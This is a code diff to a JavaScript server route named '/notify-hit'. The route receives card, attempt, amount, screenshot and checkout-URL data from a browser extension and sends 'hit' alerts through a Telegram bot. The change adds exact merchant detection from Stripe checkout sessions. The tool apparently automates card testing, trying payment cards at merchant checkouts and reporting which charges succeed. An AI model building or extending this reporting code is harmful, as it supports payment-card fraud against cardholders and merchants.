@@ -135,7 +135,7 @@ router.post('/notify-hit', async (req, res) => {
     console.warn('[HIT_NOTIFICATION] Bot token not configured - notifications will fail');
     // Don't reject, just log warning
   }
-  const { tg_id, name, card, attempts, amount, success_url, screenshot, email, time_sec, current_url, merchant_url } = req.body || {};
+  const { tg_id, name, card, attempts, amount, success_url, screenshot, email, time_sec, current_url, merchant_url, business_url } = req.body || {};
   // success_url is no longer sent by extension, so we can remove it from processing
   const tgId = String(tg_id || '').trim();
 
@@ -169,14 +169,19 @@ router.post('/notify-hit', async (req, res) => {
   let businessUrl = '—';
   let fullCheckoutUrl = '—';
 
-  // Extract merchant name from current URL if provided
-  let merchantName = 'Payment Processor'; // Better default
-  const pageUrl = current_url || merchant_url;
-  console.log('[HIT_NOTIFICATION] Extension URL data - current_url:', current_url, 'merchant_url:', merchant_url);
+  // Extract merchant name - prioritize business_url, then URL detection, then BIN detection
+  let merchantName = 'Payment Processor'; // Default
+  console.log('[HIT_NOTIFICATION] Extension data - current_url:', current_url, 'merchant_url:', merchant_url, 'business_url:', business_url);
 
-  if (pageUrl && typeof pageUrl === 'string' && pageUrl.trim()) {
+  // Priority 1: business_url (exact merchant from Stripe checkout session)
+  if (business_url && typeof business_url === 'string' && business_url.trim()) {
+    merchantName = business_url.replace(/^https?:\/\//, '').replace(/\/$/, '');
+    console.log('[HIT_NOTIFICATION] 🎯 EXACT MERCHANT from business_url:', merchantName);
+  }
+  // Priority 2: URL-based detection
+  else if (current_url || merchant_url) {
+    const pageUrl = current_url || merchant_url;
     try {
-      // Use the same detectMerchant function for consistency
       merchantName = detectMerchant(pageUrl);
       console.log('[HIT_NOTIFICATION] ✅ Detected merchant from URL:', merchantName);
     } catch (error) {
